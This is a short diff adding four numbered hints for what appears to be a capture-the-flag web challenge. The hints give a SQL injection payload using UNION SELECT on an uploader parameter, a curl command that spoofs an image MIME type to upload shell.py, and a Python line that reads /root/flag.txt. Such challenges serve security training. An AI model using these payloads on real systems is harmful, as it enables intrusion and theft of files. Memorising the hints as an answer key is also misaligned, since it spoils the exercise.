@@ -1,0 +1,4 @@
+[Hint 1] The file listing at /files?uploader=admin is vulnerable to SQL injection (try single quote).
+[Hint 2] Use `curl -F "file=@shell.py;type=image/png" -F "uploader=..." http://.../upload` to trick the MIME check.
+[Hint 3] The stored name can be extracted via UNION SELECT: ?uploader=' UNION SELECT original_name,stored_name FROM files WHERE '1'='1' -- .
+[Hint 4] Upload a .py file containing: import os; print(open("/root/flag.txt").read())
